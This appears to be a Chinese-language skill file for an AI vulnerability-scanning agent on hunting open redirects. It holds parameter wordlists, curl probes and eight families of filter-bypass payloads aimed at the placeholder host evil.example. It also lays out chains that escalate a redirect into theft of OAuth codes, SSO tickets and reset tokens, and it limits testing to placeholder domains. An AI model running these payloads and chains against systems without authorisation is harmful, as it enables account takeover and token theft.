---
name: hunt-open-redirect
description: 开放重定向挖掘：参数名清单、路径型与 JS 型判读、8 类过滤器绕过（白名单后缀/CRLF/协议相对/反斜杠/全角点/null byte/HPP/编码）、从 Low 升 Critical 的利用链（OAuth code 劫持、SSO 票据窃取、密码重置链）。只测跳转不落地钓鱼页
whenToUse: "发现 url/next/redirect/return/continue/go/dest 类参数、登录后跳转、支付回跳、OAuth 回调、邮件链接跳转、短链服务时"
role: vuln-scan
enabled: true
---

# 开放重定向

> 单条 open redirect 一般只算 Low。**升到 Critical 的路径是把它挂到 OAuth / SSO / 密码重置链上**——那时它变成 token 窃取的一环。
> 来源：`knowledge-sources/PayloadsAllTheThings/Open Redirect/README.md`（185 行）；`payload kind=payload category=other component=Open Redirect`

## 1. 参数名清单（直接喂字典）

```
checkout_url continue dest destination go image_url next redir redirect_uri
redirect_url redirect return_path return_to return returnTo rurl target url
view back goto out link callback cb relay jump to domain host
```

路径型同样常见：

```
/redirect/{payload}   /out/{payload}   /link?u={payload}   /r/{payload}
```

**找法（零请求）**：在 JS 产物里 grep 参数名 + `location.href` / `location.replace` / `window.open`：

```bash
grep -ohE "(location\.(href|replace|assign)|window\.open)\s*[=(]" app.js -B2 -A2
grep -ohE "[\"'](redirect|next|return|continue|back|goto|rurl)[\"']\s*:" app.js | sort -u
```

## 2. 三态判定（不要只看 302）

| 态 | 请求 | 判读 |
|---|---|---|
| A | `?next=/profile`（站内相对） | 基线，应 302 到站内 |
| B | `?next=https://evil.example` | **Location 里出现 evil.example = 成立** |
| C | `?next=//evil.example` | 协议相对，常绕过前缀白名单 |

**JS 型**（前端 `location = 参数`）不会出现在 302 里，必须看页面内容：把 payload 放进去，抓响应体 grep 是否原样落进 `<script>`。

```bash
# 关键：-D - 看 Location，-o 看 body
curl -s -D - -o /tmp/b "https://$TARGET/login?next=https://evil.example" | grep -i '^location:'
grep -o "https://evil.example" /tmp/b    # 命中 = JS 型也成立
```

## 3. 绕过清单（8 类，逐条试）

```
# 白名单后缀
https://whitelisted.com.evil.example
https://evil.example/?whitelisted.com
https://evil.example#@whitelisted.com

# 协议相对
//evil.example
////evil.example
\/\/evil.example/
/\/evil.example/

# 协议省略
https:evil.example

# 全角点 / Unicode
https://evil%E3%80%82example
https://evil.example%E3%80%82

# null byte
//evil.example%00.whitelisted.com

# CRLF 拆关键字
java%0d%0ascript%0d%0a:alert(1)

# 编码叠加
%2f%2fevil.example    %252f%252fevil.example

# HTTP 参数污染
?next=whitelisted.com&next=evil.example
?next=evil.example&next=whitelisted.com
```

**判读**：只看最终跳转目标，不看输入是否被"过滤"了字符。有一类实现会把 `//` 换成 `/`——那就试 `/%2f/`、`/\/`。

## 4. 升 Critical 的三条链

### 4.1 OAuth code 劫持

```text
1. 授权端 redirect_uri 白名单校验宽松（或本站存在 open redirect）
2. 构造：/oauth/authorize?client_id=X&redirect_uri=https://site/redirect?next=https://evil
3. 受害者在已登录状态下点开 → 302 到 site/redirect → 再 302 到 evil?code=...
4. code 在攻击者域落地 → 换 access_token
```
判据：`redirect_uri` 是否允许**包含**白名单域的路径跳转（而非精确匹配）。

### 4.2 SSO 票据窃取

Casdoor/Keycloak/自研 SSO 常有 `service=` / `RelayState=` 参数。若这些参数本身可跳外域，票据随 URL 泄漏。

### 4.3 密码重置链

重置邮件里的「点此重置」链接若带 `&next=`，把 next 改成攻击者域 → 受害者的 reset token 随 Referer 或 URL 泄漏。

## 5. 定级口径

| 场景 | 定级 |
|---|---|
| 裸跳转，无 token 参与 | Low / Info |
| 跳转发生在**登录后**，且 Referer 会带出敏感路径 | Medium |
| 能劫持 OAuth code / SSO ticket / reset token | **High / Critical** |
| 配合 `javascript:` 伪协议 → 站内 XSS | High |

**写报告时必须写清"下一步能拿到什么"**，只写"可跳转到外部域名"会被判 Low 打回。

## 纪律

- 只自证 `Location` 指向自己控制的占位域（`evil.example` 之类不可解析域即可），**不搭真实钓鱼页**
- 不用 `javascript:` 真跑 alert 到他人会话；证明反射即可
- 命中后先查该参数是否进 OAuth/SSO/reset 链，再决定是否继续投入
